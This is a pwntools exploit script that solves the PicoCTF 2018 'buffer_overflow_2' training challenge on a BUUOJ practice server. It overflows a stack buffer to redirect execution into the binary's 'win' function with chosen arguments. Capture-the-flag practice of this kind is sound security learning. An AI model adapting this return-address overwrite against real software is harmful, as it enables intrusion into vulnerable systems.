# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level='debug'
proc_name = 'PicoCTF_2018_buffer_overflow_2'
#p = process(proc_name)
p = remote('node3.buuoj.cn', 25361)
elf = ELF(proc_name)

padding = 'a' * 0x6C
fake_ebp = 'jkjk'
win_addr = elf.sym['win']
a1 = 0xdeadbeef
a2 = 0xdeadc0de

payload = padding + fake_ebp + p32(win_addr) + fake_ebp + p32(a1) + p32(a2)
p.sendline(payload)
p.interactive()

